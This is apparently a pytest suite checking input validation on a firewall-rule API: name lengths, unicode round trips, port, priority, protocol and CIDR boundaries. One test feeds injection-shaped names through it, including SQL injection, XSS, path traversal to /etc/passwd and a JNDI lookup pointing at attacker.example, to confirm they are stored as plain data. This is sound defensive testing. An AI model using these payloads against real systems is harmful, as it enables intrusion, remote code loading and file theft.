"""Input validation on the rule endpoints.

Boundary values, missing fields, wrong types and hostile-looking strings.
"""

import pytest

from tests.factories import make_rule

pytestmark = pytest.mark.api


# ---------------------------------------------------------------- name field


@pytest.mark.parametrize(
    ("length", "expected_status"),
    [(0, 422), (1, 201), (50, 201), (100, 201), (101, 422), (500, 422)],
    ids=["empty", "one-char", "midrange", "at-limit", "one-over-limit", "far-over-limit"],
)
def test_name_length_boundaries(client, tenant_a_headers, length, expected_status):
    """RG-API-020: name accepts 1 to 100 characters and rejects either side."""
    payload = make_rule(name="n" * length)
    response = client.post("/api/v1/rules", json=payload, headers=tenant_a_headers)
    assert response.status_code == expected_status


@pytest.mark.parametrize(
    "name",
    [
        "règle-pare-feu",
        "防火墙规则",
        "правило",
        "rule-with-emoji-\U0001f525",
        "mixed-éè-and-\U0001f512",
    ],
    ids=["accented-latin", "chinese", "cyrillic", "emoji", "mixed-script"],
)
def test_unicode_names_are_stored_and_returned_unchanged(client, tenant_a_headers, name):
    """RG-API-021: non-ASCII names survive the round trip byte for byte."""
    created = client.post("/api/v1/rules", json=make_rule(name=name), headers=tenant_a_headers)
    assert created.status_code == 201
    assert created.json()["name"] == name

    fetched = client.get(f"/api/v1/rules/{created.json()['id']}", headers=tenant_a_headers)
    assert fetched.json()["name"] == name


@pytest.mark.security
@pytest.mark.parametrize(
    "hostile_name",
    [
        "'; DROP TABLE rules; --",
        "1' OR '1'='1",
        "admin'--",
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(document.cookie)",
        "{{7*7}}",
        "${jndi:ldap://attacker.example/a}",
        "../../etc/passwd",
        "%00nullbyte",
    ],
    ids=[
        "sql-drop-table",
        "sql-tautology",
        "sql-comment",
        "script-tag",
        "img-onerror",
        "javascript-uri",
        "template-expression",
        "jndi-lookup",
        "path-traversal",
        "null-byte",
    ],
)
def test_injection_shaped_names_are_stored_verbatim(client, tenant_a_headers, hostile_name):
    """RG-API-022: injection-shaped strings are stored as data, never interpreted.

    The API layer treats these as ordinary text. Whether the browser renders
    them safely is asserted separately in the UI tests.
    """
    created = client.post(
        "/api/v1/rules", json=make_rule(name=hostile_name), headers=tenant_a_headers
    )
    assert created.status_code == 201
    assert created.json()["name"] == hostile_name

    listed = client.get("/api/v1/rules", headers=tenant_a_headers).json()
    assert listed[0]["name"] == hostile_name


# ---------------------------------------------------------------- port fields


@pytest.mark.parametrize(
    ("port_start", "port_end", "expected_status"),
    [
        (0, 65535, 201),
        (0, 0, 201),
        (65535, 65535, 201),
        (443, 443, 201),
        (80, 443, 201),
        (443, 80, 422),
        (-1, 443, 422),
        (80, 65536, 422),
        (65536, 65536, 422),
        (-1, -1, 422),
    ],
    ids=[
        "full-range",
        "port-zero-only",
        "top-port-only",
        "single-port",
        "normal-range",
        "end-before-start",
        "negative-start",
        "end-above-max",
        "start-above-max",
        "both-negative",
    ],
)
def test_port_boundaries(client, tenant_a_headers, port_start, port_end, expected_status):
    """RG-API-023: ports accept 0 to 65535 and require end to be at or after start."""
    payload = make_rule(port_start=port_start, port_end=port_end)
    response = client.post("/api/v1/rules", json=payload, headers=tenant_a_headers)
    assert response.status_code == expected_status


def test_port_range_is_accepted_for_icmp(client, tenant_a_headers):
    """RG-API-024: a port range on an ICMP rule is accepted and stored.

    ICMP has no ports. The model does not reject this today, so the test pins
    the current behaviour: the value round-trips rather than being silently
    dropped or rewritten.
    """
    payload = make_rule(protocol="icmp", port_start=80, port_end=443)
    response = client.post("/api/v1/rules", json=payload, headers=tenant_a_headers)
    assert response.status_code == 201
    assert response.json()["port_start"] == 80
    assert response.json()["port_end"] == 443


# ------------------------------------------------------------ priority field


@pytest.mark.parametrize(
    ("priority", "expected_status"),
    [(1, 201), (100, 201), (999999, 201), (0, 422), (-1, 422), (-999, 422)],
    ids=["minimum", "typical", "very-large", "zero", "negative", "large-negative"],
)
def test_priority_boundaries(client, tenant_a_headers, priority, expected_status):
    """RG-API-025: priority must be a positive integer."""
    response = client.post(
        "/api/v1/rules", json=make_rule(priority=priority), headers=tenant_a_headers
    )
    assert response.status_code == expected_status


# ------------------------------------------------------- enums and required


@pytest.mark.parametrize(
    ("protocol", "expected_status"),
    [
        ("tcp", 201),
        ("udp", 201),
        ("icmp", 201),
        ("any", 201),
        ("TCP", 422),
        ("sctp", 422),
        ("", 422),
    ],
    ids=["tcp", "udp", "icmp", "any", "uppercase-rejected", "unknown-protocol", "empty"],
)
def test_protocol_enum(client, tenant_a_headers, protocol, expected_status):
    """RG-API-026: protocol is a closed lowercase set."""
    response = client.post(
        "/api/v1/rules", json=make_rule(protocol=protocol), headers=tenant_a_headers
    )
    assert response.status_code == expected_status


@pytest.mark.parametrize(
    ("action", "expected_status"),
    [("allow", 201), ("deny", 201), ("ALLOW", 422), ("drop", 422), ("", 422)],
    ids=["allow", "deny", "uppercase-rejected", "unknown-action", "empty"],
)
def test_action_enum(client, tenant_a_headers, action, expected_status):
    """RG-API-027: action is either allow or deny."""
    response = client.post("/api/v1/rules", json=make_rule(action=action), headers=tenant_a_headers)
    assert response.status_code == expected_status


@pytest.mark.parametrize(
    "missing_field",
    ["name", "priority", "source", "destination", "protocol", "port_start", "port_end", "action"],
)
def test_missing_required_field_is_rejected(client, tenant_a_headers, missing_field):
    """RG-API-028: every required field is actually required."""
    payload = make_rule()
    payload.pop(missing_field)
    response = client.post("/api/v1/rules", json=payload, headers=tenant_a_headers)

    assert response.status_code == 422
    assert missing_field in response.text


@pytest.mark.parametrize(
    ("field", "wrong_value"),
    [
        ("priority", "high"),
        ("port_start", "eighty"),
        ("enabled", "yes-please"),
        ("name", 12345),
        ("priority", [1, 2, 3]),
        ("source", {"cidr": "10.0.0.0/8"}),
    ],
    ids=[
        "priority-as-word",
        "port-as-word",
        "enabled-as-loose-string",
        "name-as-number",
        "priority-as-list",
        "source-as-object",
    ],
)
def test_wrong_field_types_are_rejected(client, tenant_a_headers, field, wrong_value):
    """RG-API-029: a field of the wrong type gives 422 rather than being coerced."""
    payload = make_rule()
    payload[field] = wrong_value
    response = client.post("/api/v1/rules", json=payload, headers=tenant_a_headers)
    assert response.status_code == 422


def test_unexpected_extra_field_is_rejected(client, tenant_a_headers):
    """RG-API-030: an unrecognised field is refused instead of quietly ignored.

    Silently dropping an unknown field hides typos. A caller sending
    'port_stat' should be told, not left thinking the value took effect.
    """
    payload = make_rule()
    payload["unexpected_field"] = "surprise"
    response = client.post("/api/v1/rules", json=payload, headers=tenant_a_headers)
    assert response.status_code == 422


def test_empty_body_is_rejected(client, tenant_a_headers):
    """RG-API-031: an empty object gives 422, not a partially built rule."""
    response = client.post("/api/v1/rules", json={}, headers=tenant_a_headers)
    assert response.status_code == 422


def test_malformed_json_is_rejected(client, tenant_a_headers):
    """RG-API-032: a body that is not valid JSON gives 422."""
    response = client.post(
        "/api/v1/rules",
        content=b"{not valid json",
        headers={**tenant_a_headers, "Content-Type": "application/json"},
    )
    assert response.status_code == 422


# ------------------------------------------------------------ CIDR handling


@pytest.mark.parametrize(
    "bad_cidr",
    [
        "10.0.0.0/33",
        "999.1.1.1/24",
        "10.0.0.1/24",
        "",
        "not-a-network",
        "10.0.0.0/",
    ],
    ids=[
        "prefix-too-long",
        "octet-out-of-range",
        "host-bits-set",
        "empty-string",
        "free-text",
        "trailing-slash",
    ],
)
def test_malformed_cidr_is_rejected_at_the_api_boundary(client, tenant_a_headers, bad_cidr):
    """RG-API-033: a rule with an unparseable network is refused on creation.

    Storing one means every later analysis run either crashes or silently
    skips the rule. The right place to catch it is here.
    """
    response = client.post(
        "/api/v1/rules", json=make_rule(source=bad_cidr), headers=tenant_a_headers
    )
    assert response.status_code == 422


@pytest.mark.parametrize(
    "valid_cidr",
    ["10.0.0.0/8", "10.0.0.0/24", "10.0.0.0/31", "10.0.0.1/32", "0.0.0.0/0", "any"],
    ids=["class-a", "class-c", "point-to-point", "host-route", "default-route", "keyword"],
)
def test_valid_networks_are_accepted(client, tenant_a_headers, valid_cidr):
    """RG-API-034: well-formed IPv4 networks and the any keyword are accepted."""
    response = client.post(
        "/api/v1/rules", json=make_rule(source=valid_cidr), headers=tenant_a_headers
    )
    assert response.status_code == 201


def test_ipv6_source_is_rejected_with_a_clear_error(client, tenant_a_headers):
    """RG-API-035: an IPv6 network is refused rather than stored and crashed on later.

    The analyzer is IPv4 only. Accepting a v6 rule now means an exception the
    next time anyone runs an analysis.
    """
    response = client.post(
        "/api/v1/rules", json=make_rule(source="2001:db8::/32"), headers=tenant_a_headers
    )
    assert response.status_code == 422
